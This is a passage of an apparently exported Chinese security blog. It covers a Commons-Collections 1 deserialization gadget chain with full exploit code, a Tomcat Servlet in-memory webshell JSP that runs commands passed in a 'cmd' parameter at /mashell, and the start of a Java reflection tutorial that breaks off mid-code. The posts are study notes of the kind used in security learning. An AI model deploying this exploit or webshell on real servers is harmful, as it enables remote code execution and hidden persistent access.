<p>可以看到代码在进行到第一个判断时member是空，所以没有执行我们想要的代码，直接走了出去，所以就要查找有成员方法的注解传进去，这里我没有看视频便自己尝试写代码，遂在群里问，得到了师傅们的解答</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241201210336356.png" alt="image-20241201210336356"></p>
<p>所以把参数也改成了<strong>Drunkbabyzhenshuai</strong>（</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241201205418719.png" alt="image-20241201205418719"></p>
<p>（开玩笑的，这里传什么都行，主要是在进行执行方法时候应把Override换成Target注解）以及innerMap.put传的第一个值必须为value</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 3. 创建Map并添加Transformer</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;Drunkbabyzhenshuai&quot;</span>); <span class="comment">//这里必须是value 不然过不了第二个if判断</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, ChainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.反射调用AnnotationInvocationHandler</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//Object obj = constructor.newInstance(Override.class, outerMap); 错误</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Target.class, outerMap); </span><br><span class="line">serialize(obj);</span><br></pre></td></tr></table></figure>

<h2 id="控制setvalue"><a href="#控制setvalue" class="headerlink" title="控制setvalue"></a>控制setvalue</h2><p>我们绕过了以上两个if的判断，但是依旧无法命令执行，因为<code>setValue()</code> 处中的参数并不可控，指定了 <code>AnnotationTypeMismatchExceptionProxy</code> 类，是无法进行命令执行的，回到最开始找的时候，那时候有一个ConstantTransformer类，它的构造方法把传入的任何对象都放在 <code>iConstant</code> 中，然后无论传入什么都返回iConstant</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241201211910457.png" alt="image-20241201211910457"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class)</span><br></pre></td></tr></table></figure>

<p>把以上代码加进数组中，构造出最终EXP</p>
<h2 id="最终EXP代码"><a href="#最终EXP代码" class="headerlink" title="最终EXP代码"></a>最终EXP代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 创建Transformer数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 创建ChainedTransformer</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ChainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 创建Map并添加Transformer</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;Drunkbabyzhenshuai&quot;</span>); <span class="comment">//这里必须是value 不然过不了第二个if判断</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, ChainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.反射调用AnnotationInvocationHandler</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//Object obj = constructor.newInstance(Override.class, outerMap); 错误</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Target.class, outerMap);</span><br><span class="line">        serialize(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>入门CC链的第一条，学了两天看了两遍组长的视频才能理解，就像学驾照一样，考过的都觉得难，过了就感觉也就那样，轻州已过万重山</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/CC1.png" alt="CC1"></p>
]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java内存马之Servlet马</title>
    <url>/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天，学习一下Tomcat Servlet内存马，要完成Servlet内存马，就如同把大象装进冰箱一样，分为三步：1、打开冰箱门 2、把大象装进去 3、关闭冰箱门</p>
<p>所以我们就思考要完成如下操作：</p>
<p>1、 写一个马</p>
<p>2、注册进Servlet</p>
<h1 id="Tomcat-Servlet机制"><a href="#Tomcat-Servlet机制" class="headerlink" title="Tomcat Servlet机制"></a>Tomcat Servlet机制</h1><h2 id="如何注册Servlet"><a href="#如何注册Servlet" class="headerlink" title="如何注册Servlet"></a>如何注册Servlet</h2><p>在平时，我们通常使用注解**@WebServlet**来进行注册，如IDEA默认生成的的Servlet</p>
<p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250103232406511.png" alt="image-20250103232406511"></p>
<p>如果删掉注解，通过web.xml进行注册的</p>
<p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250103232636563.png" alt="image-20250103232636563"></p>
<p>通过这样的方式，也是能解析的</p>
<p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250103235122472.png" alt="image-20250103235122472"></p>
<p>那么我们就思考，这个Servlet是如何被解析到Tomcat里的</p>
<h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/cf3078a0fc03c9c3d1fab0e70505d1f7.png" alt="img"></p>
<p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/e0157398fdc5f76b582d59f778b63040.png" alt="在这里插入图片描述"></p>
<p>图片来源：<a class="link" href="https://blog.csdn.net/u010883443/article/details/107463782">https://blog.csdn.net/u010883443/article/details/107463782<i class="fas fa-external-link-alt"></i></a></p>
<p>通过上图，我们可以知道</p>
<p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250103235615909.png" alt="image-20250103235615909"></p>
<p>大概是在这个地方解析的</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>上图是先到Context的，这里Maven导入一下Tomcat，下载一下源码</p>
<p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250104000249337.png" alt="image-20250104000249337"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.81<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>全局搜索configureContext，来到这里，这里就是解析完XMl之后的操作</p>
<p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250104001426553.png" alt="image-20250104001426553"></p>
<p>断点下在这里，看看初始化时候都干了些什么</p>
<p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250104002505046.png" alt="image-20250104002505046"></p>
<p>首先调用创建了wrapper，然后调用set方法配置wrapper相关的属性，我们可以参考web.xml中需要配置的属性来推测wrapper的关键属性</p>
<p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250104003326275.png" alt="image-20250104003326275"></p>
<p>接着继续配置wrapper的servletClass，配置完成之后会将wrapper放入StandardContext的child里:</p>
<p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250104003448507.png" alt="image-20250104003448507"></p>
<p>然后遍历web.xml中servlet-mapping的servlet-name和对应的url-pattern，调用<code>StandardContext.addServletMappingDecoded()</code>添加servlet对应的映射。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下，Servlet的初始化一共有几个步骤:</p>
<ol>
<li>通过 context.createWapper() 创建 Wapper 对象</li>
<li>设置 Servlet 的 LoadOnStartUp 的值(后续分析为什么动态注册Servlet需要设置该属性)</li>
<li>设置 Servlet 的 Name</li>
<li>设置 Servlet 对应的 Class</li>
<li>将 Servlet 添加到 context 的 children 中</li>
<li>将 url 路径和 servlet 类做映射</li>
<li></li>
</ol>
<h1 id="自写马"><a href="#自写马" class="headerlink" title="自写马"></a>自写马</h1><h2 id="第一步：写个马"><a href="#第一步：写个马" class="headerlink" title="第一步：写个马"></a>第一步：写个马</h2><p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250104004454359.png" alt="image-20250104004454359"></p>
<p>第一部很简单，就写个马</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">// 写个马</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ma</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">            message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>



<h2 id="第二步：动态注册进Tomcat"><a href="#第二步：动态注册进Tomcat" class="headerlink" title="第二步：动态注册进Tomcat"></a>第二步：动态注册进Tomcat</h2><p>首先获取到StadndrdContext</p>
<p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250104010153932.png" alt="image-20250104010153932"></p>
<p>获取到后就照着之前分析的Servlet创建流程写就可以了，</p>
<p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250104011455259.png" alt="image-20250104011455259"></p>
<h2 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: georg</span><br><span class="line">  Date: <span class="number">2025</span>/<span class="number">1</span>/<span class="number">4</span></span><br><span class="line">  Time: <span class="number">00</span>:<span class="number">42</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">// 写个马</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ma</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">            message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%      <span class="comment">//动态注册Servlet</span></span><br><span class="line">    <span class="comment">// 获取StadnrdContext对象</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();  <span class="comment">//获取ServletContext对象</span></span><br><span class="line">    <span class="comment">// 反射获取StandardContext对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (ApplicationContext) contextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> context.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册进去</span></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setName(<span class="string">&quot;Ma&quot;</span>);</span><br><span class="line">    wrapper.setServletClass(<span class="string">&quot;Ma.Class.getName()&quot;</span>);</span><br><span class="line">    wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">Ma</span>()); <span class="comment">//这里是关键，这里是将Servlet对象传递给了Wrapper对象,实例化了一个Ma对象</span></span><br><span class="line"></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/mashell&quot;</span>, <span class="string">&quot;Ma&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250104011608556.png" alt="image-20250104011608556"></p>
<p>先访问ma.jsp，而后访问注入的路径。</p>
<p><img src="/2025/01/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E9%A9%AC/image-20250104011949695.png" alt="image-20250104011949695"></p>
<p>执行代码~</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a class="link" href="https://www.bilibili.com/video/BV1E84y1w77R/?spm_id_from=333.999.0.0&vd_source=7ee5bc742ad8e76b4536e01b16e6839d">白日梦组长<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/">Longlone’s Blog<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://blog.csdn.net/u010883443/article/details/107463782">Tomcat流程分析<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反射学习</title>
    <url>/2024/11/27/Java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>早在几个月前在学习Java开发阶段就有了解过一点反射，但最近学习反序列化感觉之前学的还是有点不太够用，基础不牢地动山摇，遂今天跟着Drunkbaby师傅的<a class="link" href="https://drun1baby.top/2022/05/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-02-Java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE%E5%88%86%E6%9E%90/" title="Java反射基础">博客<i class="fas fa-external-link-alt"></i></a>以及参考p牛的<a class="link" href="https://govuln.com/docs/java-things/" title="java安全漫谈">Java安全漫谈<i class="fas fa-external-link-alt"></i></a>重新学习一遍反射，也是对自己的一次查缺补漏</p>
<p><img src="/2024/11/27/Java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/image-20241127131500409.png" alt="image-20241127131500409"></p>
<h1 id="反射基础学习"><a href="#反射基础学习" class="headerlink" title="反射基础学习"></a>反射基础学习</h1><p>反射是大多数语言都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有的方法（包括private修饰符的方法），总之通过反射我们将Java这种静态语言附加上动态特性</p>
<h2 id="入门："><a href="#入门：" class="headerlink" title="入门："></a>入门：</h2><blockquote>
<p>需要明确的是，反射只是一种手段，并不能直接造成攻击的效果，最后的攻击链还是要我们自己构造的</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.study.entity.Person&quot;</span>);</span><br><span class="line">    clazz.getMethod(<span class="string">&quot;test&quot;</span>).invoke(clazz.newInstance());</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在上述例子中，有几个在反射里极为重要的方法：</p>
<ul>
<li>获取类的方法：<strong>forName</strong></li>
<li>实例化类对象的方法：<strong>newInstance</strong></li>
<li>获取函数的方法：<strong>getMethod</strong></li>
<li>执行函数的方法:<strong>invoke</strong></li>
</ul>
<p>基本上这几个方法就是Java安全里常用的了</p>
<h2 id="反射的使用方法"><a href="#反射的使用方法" class="headerlink" title="反射的使用方法"></a>反射的使用方法</h2><p>使用反射首先要实例化对象，有三种实例化方法</p>
<h3 id="三种实例化方法"><a href="#三种实例化方法" class="headerlink" title="三种实例化方法"></a>三种实例化方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.study.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 方法一：类的.class属性</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Person.class;</span><br><span class="line">    System.out.println(c1.getName());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 方法二：对象的getClass()方法</span></span><br><span class="line">    <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> p.getClass();</span><br><span class="line">    System.out.println(c2.getName());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 方法三：Class类的静态方法forName()</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.study.entity.Person&quot;</span>);</span><br><span class="line">    System.out.println(c3.getName());</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/11/27/Java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/image-20241127134309653.png" alt="image-20241127134309653"></p>
<h3 id="获取类里的属性"><a href="#获取类里的属性" class="headerlink" title="获取类里的属性"></a>获取类里的属性</h3><p>在上文中已经学习了如何去通过反射实例化对象，实例化对象的下一步就是要获取类里面的各种属性</p>
<h4 id="1、获取成员变量Field"><a href="#1、获取成员变量Field" class="headerlink" title="1、获取成员变量Field"></a>1、获取成员变量Field</h4><blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li>Field[] getFields() ：获取所有 public 修饰的成员变量</li>
<li>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</li>
<li>Field getField(String name) 获取指定名称的 public 修饰的成员变量</li>
<li>Field getDeclaredField(String name) 获取指定的成员变量</li>
</ul>
<p><img src="/2024/11/27/Java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/image-20241127135159211.png" alt="image-20241127135159211"></p>
<p>放个源代码，方便Copy~</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Person.class;</span><br><span class="line">    System.out.println(c1.getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取成员变量Field</span></span><br><span class="line">    Field[] fields = c1.getFields(); <span class="comment">//只能找到public成员变量</span></span><br><span class="line">    <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我只能找到public的成员变量：&quot;</span> + 